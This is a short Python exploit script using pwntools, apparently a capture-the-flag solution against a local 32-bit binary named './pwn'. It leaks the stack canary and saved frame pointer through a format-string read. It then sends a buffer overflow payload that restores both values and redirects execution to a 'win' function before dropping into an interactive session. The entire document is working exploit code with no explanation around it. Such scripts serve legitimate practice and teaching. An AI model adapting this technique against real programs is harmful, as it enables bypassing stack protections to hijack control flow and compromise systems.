#!/bin/python3

from pwn import *
p = process('./pwn')
e = ELF('./pwn')
r = ROP('./pwn')

def leakCanary_EBP(proc):
	offsetToCanary = 0xffc4adac - 0xffc4ad70
	num = offsetToCanary // 4 # number of 4-byte values in range
	payload = f'%{num}$x %{num+1}$x'
	proc.sendline(payload.encode())
	proc.recvuntil(b'back:\n')
	leak = proc.recvline().rstrip().split()
	leak_addr = "0x"+leak[0].decode()
	ebp_addr = "0x"+leak[1].decode()

	return int(leak_addr, 16), int(ebp_addr, 16)

canary, ebp = leakCanary_EBP(p)
log.info(f"Leaked canary: {hex(canary)}")

#         eip       -  AAAA
offset = 0xffcde46c - 0xffcde42c
# 				 canary 	- input
offsetToCanary = 0xffcde44c - 0xffcde42c
									# - len(canary) - len(ebp)
offsetToWin = offset - offsetToCanary - 4 - 4

payload = b'A'*offsetToCanary
payload += p32(canary)
payload += p32(ebp) # weird function epilogue, so we add old ebp manually
payload += b'B'*offsetToWin
payload += p32(e.sym['win'])


p.sendline(payload)
p.interactive()
